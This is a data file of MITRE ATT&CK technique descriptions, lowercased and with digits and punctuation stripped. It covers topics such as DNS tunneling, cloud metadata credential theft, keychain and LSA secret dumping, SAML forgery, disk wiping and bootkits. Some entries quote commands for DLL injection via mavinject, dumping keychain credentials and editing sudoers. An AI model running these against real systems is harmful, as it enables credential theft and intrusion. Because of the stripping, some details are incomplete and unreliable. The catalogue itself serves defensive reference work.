attack-pattern--17fd695c-b88c-455a-a3d1-43b6cb728532,['enterprise-attack'],['T1596.001'],DNS/Passive DNS,adversaries may search dns data for information about victims that can be used during targeting  dns information may include a variety of details  including registered name servers as well as records that outline addressing for a target s subdomains  mail servers  and other hosts_  adversaries may search dns data to gather actionable information  threat actors can query nameservers for a target organization directly  or search through centralized repositories of logged dns query responses  known as passive dns _ citation  dns dumpster  citation  circl passive dns  adversaries may also seek and target dns misconfigurations leaks that reveal information about internal networks  information from these sources may reveal opportunities for other forms of reconnaissance  ex   search victim owned  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   external remote  or  trusted
attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9,['enterprise-attack'],['T1499.003'],Application Exhaustion Flood,adversaries may target resource intensive features of applications to cause a denial of service  dos   denying availability to those applications  for example  specific features in web applications may be highly resource intensive  repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself_ citation  arbor annualdosreport jan      
attack-pattern--18d4ab39-12ed-4a16-9fdb-ae311bba4a0f,['enterprise-attack'],['T1163'],Rc.common,during the boot process  macos executes source  etc rc_common  which is a shell script containing various utility functions  this file also defines routines for processing command line arguments and for gathering system settings  and is thus recommended to include in the start of startup item scripts  citation  startup items   in macos and os x  this is now a deprecated technique in favor of launch agents and launch daemons  but is currently still used_  adversaries can use the rc_common file as a way to hide code for persistence that will execute on each reboot as the root user  citation  methods of mac malware persistence  
attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720,['enterprise-attack'],['T1195.001'],Compromise Software Dependencies and Development Tools,adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise  applications often depend on external software to function properly  popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency_ citation  trendmicro npm compromise     targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims 
attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421,['enterprise-attack'],['T1588.004'],Digital Certificates,adversaries may buy and or steal ssl tls certificates that can be used during targeting  ssl tls certificates are designed to instill trust  they include information about the key  information about its owner's identity  and the digital signature of an entity that has verified the certificate's contents are correct  if the signature is valid  and the person examining the certificate trusts the signer  then they know they can use that key to communicate with its owner_  adversaries may purchase or steal ssl tls certificates to further their operations  such as encrypting c  traffic  ex   asymmetric  with  web  or even enabling  if the certificate is trusted or otherwise added to the root of trust  i_e   install root  the purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity  adversaries may also steal certificate materials directly from a compromised third party  including from certificate authorities  adversaries may register or hijack domains that they will later purchase an ssl tls certificate for_  certificate authorities exist that allow adversaries to acquire ssl tls certificates  such as domain validation certificates  for free_ citation  let's encrypt faq   after obtaining a digital certificate  an adversary may then install that certificate  see  install digital  on infrastructure under their control 
attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81,['enterprise-attack'],['T1583.002'],DNS Server,adversaries may set up their own domain name system  dns  servers that can be used during targeting  during post compromise activity  adversaries may utilize dns traffic for various tasks  including for command and control  ex   application layer  instead of hijacking existing dns servers  adversaries may opt to configure and run their own dns servers in support of operations_  by running their own dns servers  adversaries can have more control over how they administer server side dns c  traffic  with control over a dns server  adversaries can configure dns applications to provide conditional responses to malware and  generally  have more flexibility in the structure of the dns based c  channel_ citation  unit   dns mar      
attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967,['enterprise-attack'],['T1561'],Disk Wipe,adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources  with direct write access to a disk  adversaries may attempt to overwrite portions of disk data  adversaries may opt to wipe arbitrary portions of disk data and or wipe disk structures like the master boot record  mbr   a complete wipe of all disk sectors may be attempted_  to maximize impact on the target organization in operations where network wide availability interruption is the goal  malware used for wiping disks may have worm like features to propagate across a network by leveraging additional techniques like  valid   os credential  and  smb windows admin  novetta blockbuster destructive malware 
attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72,['enterprise-attack'],['T1071.004'],DNS,adversaries may communicate using the domain name system  dns  application layer protocol to avoid detection network filtering by blending in with existing traffic  commands to the remote system  and often the results of those commands  will be embedded within the protocol traffic between the client and server    the dns protocol serves an administrative function in computer networking and thus may be very common in environments  dns traffic may also be allowed even before network authentication is completed  dns packets contain many fields and headers in which data can be concealed  often known as dns tunneling  adversaries may abuse dns to communicate with systems under their control within a victim network while also mimicking normal  expected traffic_ citation  pan dns tunneling  citation  medium dnstunneling 
attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3,['enterprise-attack'],['T1552.005'],Cloud Instance Metadata API,adversaries may attempt to access the cloud instance metadata api to collect credentials and other sensitive data_  most cloud service providers support a cloud instance metadata api which is a service provided to running virtual instances that allows applications to access information about the running virtual instance  available information generally includes name  security group  and additional metadata including sensitive data such as credentials and userdata scripts that may contain additional secrets  the instance metadata api is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance_ citation  aws instance metadata api  a cloud metadata api has been used in at least one high profile compromise_ citation  krebs capital one august        if adversaries have a presence on the running virtual instance  they may query the instance metadata api directly to identify credentials that grant access to additional resources  additionally  adversaries may exploit a server side request forgery  ssrf  vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the instance metadata api_ citation  redlock instance metadata api        the de facto standard across cloud service providers is to host the instance metadata api at http        _   _   _   _
attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72,['enterprise-attack'],['T1555.002'],Securityd Memory,an adversary may obtain root access  allowing them to read securityd s memory   then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user s logon keychain  this provides the adversary with all the plaintext passwords for users  wifi  mail  browsers  certificates  secure notes  etc_ citation  os x keychain  citation  osx keydnap malware   in os x prior to el capitan  users with root access can read plaintext keychain passwords of logged in users because apple s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords_ citation  os x keychain  citation  external to da  the os x way  apple s securityd utility takes the user s logon password  encrypts it with pbkdf   and stores this master key in memory  apple also uses a set of keys and algorithms to encrypt the user s password  but once the master key is found  an adversary need only iterate over the other values to unlock the final password_ citation  os x keychain 
attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b,['enterprise-attack'],['T1615'],Group Policy Discovery,adversaries may gather information on group policy settings to identify paths for privilege escalation  security measures applied within a domain  and to discover patterns in domain objects that can be manipulated or used to blend in the environment  group policy allows for centralized management of user and computer settings in active directory  ad   group policy objects  gpos  are containers for group policy settings made up of files stored within a predicable network path   sysvol  policies _ citation  technet group policy basics  citation  adsecurity gpo persistence        adversaries may use commands such as gpresult or various publicly available powershell functions  such as get domaingpo and get domaingpolocalgroup  to gather information on group policy settings_ citation  microsoft gpresult  citation  github powershell empire  adversaries may use this information to shape follow on behaviors  including determining potential attack paths within the target network as well as opportunities to manipulate group policy settings  i_e   domain policy  for their benefit 
attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba,['enterprise-attack'],['T1542.003'],Bootkit,adversaries may use bootkits to persist on systems  bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly_  a bootkit is a malware variant that modifies the boot sectors of a hard drive  including the master boot record  mbr  and volume boot record  vbr    citation  mandiant m trends       the mbr is the section of disk that is first loaded after completing hardware initialization by the bios  it is the location of the boot loader  an adversary who has raw access to the boot drive may overwrite this area  diverting execution during startup from the normal boot loader to adversary code   citation  lau        the mbr passes control of the boot process to the vbr  similar to the case of mbr  an adversary who has raw access to the boot drive may overwrite the vbr to divert execution during startup to adversary code 
attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec,['enterprise-attack'],['T1025'],Data from Removable Media,adversaries may search connected removable media on computers they have compromised to find files of interest  sensitive data can be collected from any removable media  optical disk drive  usb memory  etc_  connected to the compromised system prior to exfiltration  interactive command shells may be in use  and common functionality within  may be used to gather information    some adversaries may also use  automated  on removable media 
attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d,['enterprise-attack'],['T1116'],Code Signing,code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with   citation  wikipedia code signing  however  adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries   the certificates used during an operation may be created  forged  or stolen by the adversary   citation  securelist digital certificates   citation  symantec digital certificates   code signing to verify software on first run can be used on modern windows and macos os x systems  it is not used on linux due to the decentralized nature of the platform   citation  wikipedia code signing   code signing certificates may be used to bypass security policies that require signed code to execute on a system 
attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9,['enterprise-attack'],['T1218.013'],Mavinject,adversaries may abuse mavinject_exe to proxy execution of malicious code  mavinject_exe is the microsoft application virtualization injector  a windows utility that can inject code into external processes as part of microsoft application virtualization  app v _ citation  lolbas mavinject   adversaries may abuse mavinject_exe to inject malicious dlls into running processes  i_e   dynamic link library  allowing for arbitrary code execution  ex  c  windows system   mavinject_exe pid  injectrunning path_dll _ citation  att lazarus ttp evolution  citation  reaqta mavinject  since mavinject_exe may be digitally signed by microsoft  proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process    in addition to  dynamic link library  mavinject_exe can also be abused to perform import descriptor injection via its   hmodule command line parameter  ex  mavinject_exe pid  hmodule base_address path_dll ordinal_number   this command would inject an import table entry consisting of the specified dll into the module at the given base address_ citation  mavinject functionality deconstructed 
attack-pattern--1c2fd73a-e634-44ed-b1b5-9e7cf7404e9f,['enterprise-attack'],['T1522'],Cloud Instance Metadata API,adversaries may attempt to access the cloud instance metadata api to collect credentials and other sensitive data_  most cloud service providers support a cloud instance metadata api which is a service provided to running virtual instances that allows applications to access information about the running virtual instance  available information generally includes name  security group  and additional metadata including sensitive data such as credentials and userdata scripts that may contain additional secrets  the instance metadata api is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance_ citation  aws instance metadata api   if adversaries have a presence on the running virtual instance  they may query the instance metadata api directly to identify credentials that grant access to additional resources  additionally  attackers may exploit a server side request forgery  ssrf  vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the instance metadata api_ citation  redlock instance metadata api        the de facto standard across cloud service providers is to host the instance metadata api at http        _   _   _   _
attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21,['enterprise-attack'],['T1093'],Process Hollowing,process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code  similar to  process  execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis   citation  leitch hollowing   citation  elastic process injection july      
attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c,['enterprise-attack'],['T1074.001'],Local Data Staging,adversaries may stage collected data in a central location or directory on the local system prior to exfiltration  data may be kept in separate files or combined into one file through techniques such as  archive collected  interactive command shells may be used  and common functionality within  and bash may be used to copy data into a staging location_  adversaries may also stage collected data in various available formats locations of a system  including local storage databases repositories or the windows registry_ citation  prevailion darkwatchman      
attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2,['enterprise-attack'],['T1036.005'],Match Legitimate Name or Location,adversaries may match or approximate the name or location of legitimate files or resources when naming placing them  this is done for the sake of evading defenses and observation  this may be done by placing an executable in a commonly trusted directory  ex  under system    or giving it the name of a legitimate  trusted program  ex  svchost_exe   in containerized environments  this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster  alternatively  a file or container image name given may be a close approximation to legitimate programs images or something innocuous_  adversaries may also use the same icon of the file they are trying to mimic 
attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd,['enterprise-attack'],['T1172'],Domain Fronting,domain fronting takes advantage of routing schemes in content delivery networks  cdns  and other services which host multiple domains to obfuscate the intended destination of https traffic or traffic tunneled through https   citation  fifield blocking resistent communication through domain fronting       the technique involves using different domain names in the sni field of the tls header and the host field of the http header  if both domains are served from the same cdn  then the cdn may route to the address specified in the http header after unwrapping the tls header  a variation of the the technique   domainless  fronting  utilizes a sni field that is left blank  this may allow the fronting to work even when the cdn attempts to validate that the sni and http host fields match  if the blank sni fields are ignored _  for example  if domain x and domain y are customers of the same cdn  it is possible to place domain x in the tls header and domain y in the http header  traffic will appear to be going to domain x  however the cdn may route it to domain y 
attack-pattern--1cec9319-743b-4840-bb65-431547bce82a,['enterprise-attack'],['T1587.003'],Digital Certificates,adversaries may create self signed ssl tls certificates that can be used during targeting  ssl tls certificates are designed to instill trust  they include information about the key  information about its owner's identity  and the digital signature of an entity that has verified the certificate's contents are correct  if the signature is valid  and the person examining the certificate trusts the signer  then they know they can use that key to communicate with its owner  in the case of self signing  digital certificates will lack the element of trust associated with the signature of a third party certificate authority  ca _  adversaries may create self signed ssl tls certificates that can be used to further their operations  such as encrypting c  traffic  ex   asymmetric  with  web  or even enabling  if added to the root of trust  i_e   install root   after creating a digital certificate  an adversary may then install that certificate  see  install digital  on infrastructure under their control 
attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292,['enterprise-attack'],['T1565.001'],Stored Data Manipulation,adversaries may insert  delete  or manipulate data at rest in order to influence external outcomes or hide activity  thus threatening the integrity of the data_ citation  fireeye apt   oct       citation  doj lazarus sony       by manipulating stored data  adversaries may attempt to affect a business process  organizational understanding  and decision making_  stored data could include a variety of file formats  such as office files  databases  stored emails  and custom file formats  the type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d,['enterprise-attack'],['T1110.002'],Password Cracking,adversaries may use password cracking to attempt to recover usable credentials  such as plaintext passwords  when credential material such as password hashes are obtained   os credential  can be used to obtain password hashes  this may only get an adversary so far when  pass the  is not an option  further   adversaries may leverage  data from configuration  in order to obtain hashed credentials for network devices    techniques to systematically guess the passwords used to compute hashes are available  or the adversary may use a pre computed rainbow table to crack hashes  cracking hashes is usually done on adversary controlled systems outside of the target network_ citation  wikipedia password cracking  the resulting plaintext password resulting from a successfully cracked hash may be used to log into systems  resources  and services in which the account has access 
attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d,['enterprise-attack'],['T1178'],SID-History Injection,the windows security identifier  sid  is a unique value that identifies a user or group account  sids are used by windows security in both security descriptors and access tokens   citation  microsoft sid  an account can hold additional sids in the sid history active directory attribute  citation  microsoft sid history attribute   allowing inter operable account migration between domains  e_g_  all values in sid history are included in access tokens _  adversaries may use this mechanism for privilege escalation  with domain administrator  or equivalent  rights  harvested or well known sid values  citation  microsoft well known sids jun       may be inserted into sid history to enable impersonation of arbitrary users groups such as enterprise administrators  this manipulation may result in elevated access to local resources and or access to otherwise inaccessible domains via lateral movement techniques such as  remote   windows admin  or  windows remote
attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004,['enterprise-attack'],['T1114.001'],Local Email Collection,adversaries may target user email on local systems to collect sensitive information  files containing email data can be acquired from a user s local system  such as outlook storage or cache files_  outlook stores data locally in offline data files with an extension of _ost  outlook      and later supports _ost file sizes up to   gb  while earlier versions of outlook support up to   gb_ citation  outlook file sizes  imap accounts in outlook       and earlier  and pop accounts use outlook data files  _pst  as opposed to _ost  whereas imap accounts in outlook       and later  use _ost files  both types of outlook data files are typically stored in  c  users  documents outlook files  or  c  users  appdata local microsoft outlook _ citation  microsoft outlook files 
attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3,['enterprise-attack'],['T1555.001'],Keychain,adversaries may acquire credentials from keychain  keychain  or keychain services  is the macos credential management system that stores account names  passwords  private keys  certificates  sensitive application data  payment data  and secure notes  there are three types of keychains  login keychain  system keychain  and local items  icloud  keychain  the default keychain is the login keychain  which stores user passwords and information  the system keychain stores items accessed by the operating system  such as items shared among users on a host  the local items  icloud  keychain is used for items synced with apple s icloud service    keychains can be viewed and edited through the keychain access application or using the command line utility security  keychain files are located in   library keychains    library keychains   and  network library keychains _ citation  keychain services apple  citation  keychain decryption passware  citation  osx keychain schaumann   adversaries may gather user credentials from keychain storage memory  for example  the command security dump keychain  d will dump all login keychain credentials from   library keychains login_keychain db  adversaries may also directly read login keychain credentials from the   library keychains login_keychain file  both methods require a password  where the default password for the login keychain is the current user s password to login to the macos host_ citation  external to da  the os x way  citation  empire keychain decrypt 
attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf,['enterprise-attack'],['T1547'],Boot or Logon Autostart Execution,adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher level privileges on compromised systems  operating systems may have mechanisms for automatically running a program on system boot or account logon_ citation  microsoft run key  citation  msdn authentication packages  citation  microsoft timeprovider  citation  cylance reg persistence sept       citation  linux kernel programming  these mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information  such as the windows registry  an adversary may achieve the same goal by modifying or extending features of the kernel_  since some boot or logon autostart programs run with higher privileges  an adversary may leverage these to elevate privileges 
attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc,['enterprise-attack'],['T1003.004'],LSA Secrets,adversaries with system access to a host may attempt to access local security authority  lsa  secrets  which can contain a variety of different credential materials  such as credentials for service accounts_ citation  passcape lsa secrets  citation  microsoft ad admin tier model  citation  tilbury windows credentials  lsa secrets are stored in the registry at hkey_local_machine security policy secrets  lsa secrets can also be dumped from memory_ citation  ired dumping lsa secrets    can be used to extract from the registry   can be used to extract secrets from memory_ citation  ired dumping lsa secrets 
attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125,['enterprise-attack'],['T1013'],Port Monitors,a port monitor can be set through the   api call to set a dll to be loaded at startup   this dll can be located in c  windows system   and will be loaded by the print spooler service  spoolsv_exe  on boot  the spoolsv_exe process also runs under system level permissions   alternatively  an arbitrary dll can be loaded if permissions allow writing a fully qualified pathname for that dll to hklm system currentcontrolset control print monitors    the registry key contains entries for the following     local port   standard tcp ip port   usb monitor   wsd port  adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as system 
attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8,['enterprise-attack'],['T1600'],Weaken Encryption,adversaries may compromise a network device s encryption capability in order to bypass encryption that would otherwise protect data communications   citation  cisco synful knock evolution   encryption can be used to protect transmitted network traffic to maintain its confidentiality  protect against unauthorized disclosure  and integrity  protect against unauthorized changes   encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key  typically  longer keys increase the cost of cryptanalysis  or decryption without the key_  adversaries can compromise and manipulate devices that perform encryption of network traffic  for example  through behaviors such as  modify system   reduce key  and  disable crypto  an adversary can negatively effect and or eliminate a device s ability to securely encrypt network traffic  this poses a greater risk of unauthorized disclosure and may help facilitate data manipulation  credential access  or collection efforts   citation  cisco blog legacy device attacks 
attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2,['enterprise-attack'],['T1606.002'],SAML Tokens,an adversary may forge saml tokens with any permissions claims and lifetimes if they possess a valid saml token signing certificate_ citation  microsoft solarwinds steps  the default lifetime of a saml token is one hour  but the validity period can be specified in the notonorafter value of the conditions ___ element in a token  this value can be changed using the accesstokenlifetime in a lifetimetokenpolicy_ citation  microsoft saml token lifetimes  forged saml tokens enable adversaries to authenticate across services that use saml  _  as an sso  single sign on  mechanism_ citation  cyberark golden saml   an adversary may utilize  private  to compromise an organization's token signing certificate to create forged saml tokens  if the adversary has sufficient permissions to establish a new federation trust with their own active directory federation services  ad fs  server  they may instead generate their own trusted token signing certificate_ citation  microsoft solarwinds customer guidance  this differs from  steal application access  and other similar behaviors in that the tokens are new and forged by the adversary  rather than stolen or intercepted from legitimate users_  an adversary may gain administrative azure ad privileges if a saml token is forged which claims to represent a highly privileged account  this may lead to  use alternate authentication  which may bypass multi factor and other authentication protection mechanisms_ citation  microsoft solarwinds customer guidance 
attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba,['enterprise-attack'],['T1192'],Spearphishing Link,spearphishing with a link is a specific variant of spearphishing  it is different from other forms of spearphishing in that it employs the use of links to download malware contained in email  instead of attaching malicious files to the email itself  to avoid defenses that may inspect email attachments    all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this case  the malicious emails contain links  generally  the links will be accompanied by social engineering text and require the user to actively click or copy and paste a url into a browser  leveraging  user  the visited website may compromise the web browser using an exploit  or the user will be prompted to download applications  documents  zip files  or even executables depending on the pretext for the email in the first place  adversaries may also include links that are intended to interact directly with an email reader  including embedded images intended to exploit the end system directly or verify the receipt of an email  i_e  web bugs web beacons   links may also direct users to malicious applications  designed to  steal application access  like oauth tokens  in order to gain access to protected applications and information_ citation  trend micro pawn storm oauth      
attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b,['enterprise-attack'],['T1489'],Service Stop,adversaries may stop or disable services on a system to render those services unavailable to legitimate users  stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment_ citation  talos olympic destroyer       citation  novetta blockbuster    adversaries may accomplish this by disabling individual services of high importance to an organization  such as msexchangeis  which will make exchange content inaccessible  citation  novetta blockbuster   in some cases  adversaries may stop or disable many or all services to render systems unusable_ citation  talos olympic destroyer       services or processes may not allow for modification of their data stores while running  adversaries may stop services or processes in order to conduct  data  or  data encrypted for  on the data stores of services like exchange and sql server_ citation  secureworks wannacry analysis 
attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0,['enterprise-attack'],['T1587.001'],Malware,adversaries may develop malware and malware components that can be used during targeting  building malicious software can include the development of payloads  droppers  post compromise tools  backdoors  including backdoored images   packers  c  protocols  and the creation of infected removable media  adversaries may develop malware to support their operations  creating a means for maintaining control of remote machines  evading defenses  and executing post compromise behaviors_ citation  mandiant apt   citation  kaspersky sofacy  citation  fbi flash fin  usb   as with legitimate development efforts  different skill sets may be required for developing malware  the skills needed may be located in house  or may need to be contracted out  use of a contractor may be considered an extension of that adversary's malware development capabilities  provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware_  some aspects of malware development  such as c  protocol development  may require adversaries to obtain additional infrastructure  for example  malware developed that will communicate with twitter for c   may require use of  web  fireeye apt   
attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302,['enterprise-attack'],['T1121'],Regsvcs/Regasm,regsvcs and regasm are windows command line utilities that are used to register _net component object model  com  assemblies  both are digitally signed by microsoft   citation  msdn regsvcs   citation  msdn regasm   adversaries can use regsvcs and regasm to proxy execution of code through a trusted windows utility  both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration   comregisterfunction  or  comunregisterfunction  respectively  the code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute   citation  lolbas regsvcs  citation  lolbas regasm 
attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e,['enterprise-attack'],['T1206'],Sudo Caching,the sudo command  allows a system administrator to delegate authority to give certain users  or groups of users  the ability to run some  or all  commands as root or another user while providing an audit trail of the commands and their arguments    citation  sudo man page       since sudo was made for the system administrator  it has some useful configuration features such as a timestamp_timeout that is the amount of time in minutes between instances of sudo before it will re prompt for a password  this is because sudo has the ability to cache credentials for a period of time  sudo creates  or touches  a file at  var db sudo with a timestamp of when sudo was last run to determine this timeout  additionally  there is a tty_tickets variable that treats each new tty  terminal session  in isolation  this means that  for example  the sudo timeout of one tty will not affect another tty  you will have to type the password again _  adversaries can abuse poor configurations of this to escalate privileges without needing the user's password   var db sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range  if it does  then malware can execute sudo commands without needing to supply the user's password  when tty_tickets is disabled  adversaries can do this from any tty for that user    the osx proton malware has disabled tty_tickets to potentially make scripting easier by issuing echo  'defaults  tty_tickets '     etc sudoers   citation  cybereason osx proton   in order for this change to be reflected  the proton malware also must issue killall terminal  as of macos sierra  the sudoers file has tty_tickets enabled by default 
attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af,['enterprise-attack'],['T1087.002'],Domain Account,adversaries may attempt to get a listing of domain accounts  this information can help adversaries determine which domain accounts exist to aid in follow on behavior_  commands such as net user  domain and net group  domain of the  utility  dscacheutil  q groupon macos  and ldapsearch on linux can list domain users and groups 
attack-pattern--22522668-ddf6-470b-a027-9d6866679f67,['enterprise-attack'],['T1547.014'],Active Setup,adversaries may achieve persistence by adding a registry key to the active setup of the local machine  active setup is a windows mechanism that is used to execute programs when a user logs in  the value stored in the registry key will be executed after a user logs into the computer_ citation  klein active setup       these programs will be executed under the context of the user and will have the account's associated permissions level_  adversaries may abuse active setup by creating a key under  hklm software microsoft active setup installed components  and setting a malicious value for stubpath  this value will serve as the program that will be executed when a user logs into the computer_ citation  mandiant glyer apt       citation  citizenlab packrat       citation  fireeye cfr watering hole       citation  securelist bright star       citation  paloalto tropic trooper        adversaries can abuse these components to execute malware  such as remote access tools  to maintain persistence through system reboots  adversaries may also use  to make the registry entries look as if they are associated with legitimate programs 
attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8,['enterprise-attack'],['T1564'],Hide Artifacts,adversaries may attempt to hide artifacts associated with their behaviors to evade detection  operating systems may have features to hide various artifacts  such as important system files and administrative task execution  to avoid disrupting user work environments and prevent users from changing files or features on the system  adversaries may abuse these features to hide artifacts such as files  directories  user accounts  or other system activity to evade detection_ citation  sofacy komplex trojan  citation  cybereason osx pirrit  citation  malwarebytes ads july        adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation  such as through the use of virtualization technology_ citation  sophos ragnar may      
attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d,['enterprise-attack'],['T1559.002'],Dynamic Data Exchange,adversaries may use windows dynamic data exchange  dde  to execute arbitrary commands  dde is a client server protocol for one time and or continuous inter process communication  ipc  between applications  once a link is established  applications can autonomously exchange transactions consisting of strings  warm data links  notifications when a data item changes   hot data links  duplications of changes to a data item   and requests for command execution_  object linking and embedding  ole   or the ability to link data between documents  was originally implemented through dde  despite being superseded by  component object  dde may be enabled in windows    and most of microsoft office      via registry keys_ citation  bleepingcomputer dde disabled in word dec       citation  microsoft adv       dec       citation  microsoft dde advisory nov        microsoft office documents can be poisoned with dde commands  directly or through embedded files  and used to deliver execution via  campaigns or hosted web content  avoiding the use of visual basic for applications  vba  macros_ citation  sensepost ps dde may       citation  kettle csv dde aug       citation  enigma reviving dde jan       citation  sensepost macroless dde oct       similarly  adversaries may infect payloads to execute applications and or commands on a victim device by way of embedding dde formulas within a csv file intended to be opened through a windows spreadsheet program_ citation  owasp csv injection  citation  csv excel macro injection    dde could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a  command and scripting  dde execution can be invoked remotely via  remote  such as  distributed component object   dcom _ citation  fireeye hunting com june      
attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e,['enterprise-attack'],['T1204.002'],Malicious File,an adversary may rely upon a user opening a malicious file in order to gain execution  users may be subjected to social engineering to get them to open a file that will lead to code execution  this user action will typically be observed as follow on behavior from  spearphishing  adversaries may use several types of files that require a user to execute them  including _doc  _pdf  _xls  _rtf  _scr  _exe  _lnk  _pif  and _cpl_  adversaries may employ various forms of  and  obfuscated files or  to increase the likelihood that a user will open and successfully execute a malicious file  these methods may include using a familiar naming convention and or password protecting the file and supplying instructions to a user on how to open it_ citation  password protected word docs    while  malicious  frequently occurs shortly after initial access it may occur at other phases of an intrusion  such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it  this activity may also be seen shortly after  internal
attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f,['enterprise-attack'],['T1591.003'],Identify Business Tempo,adversaries may gather information about the victim's business tempo that can be used during targeting  information about an organization s business tempo may include a variety of details  including operational hours days of the week  this information may also reveal times dates of purchases and shipments of the victim s hardware and software resources_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about business tempo may also be exposed to adversaries via online or other accessible data sets  ex   social  or  search victim owned  threatpost broadvoice leak  gathering this information may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   supply chain  or  trusted
attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7,['enterprise-attack'],['T1063'],Security Software Discovery,adversaries may attempt to get a listing of security software  configurations  defensive tools  and sensors that are installed on the system  this may include things such as local firewall rules and anti virus  adversaries may use the information from  security software  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_       windows  example commands that can be used to obtain security software information are  reg query with  dir with  and  but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for_      mac  it's becoming more common to see macos malware perform checks for littlesnitch and knockknock software 
attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26,['enterprise-attack'],['T1592.001'],Hardware,adversaries may gather information about the victim's host hardware that can be used during targeting  information about hardware infrastructure may include a variety of details such as types and versions on specific hosts  as well as the presence of additional components that might be indicative of added defensive protections  ex  card biometric readers  dedicated encryption hardware  etc_ _  adversaries may gather this information in various ways  such as direct collection actions via  active   ex  hostnames  server banners  user agent strings  or  phishing for  adversaries may also compromise sites then include malicious content designed to collect host information from visitors_ citation  att scanbox  information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets  ex  job postings  network maps  assessment reports  resumes  or purchase invoices   gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   compromise hardware supply  or  hardware
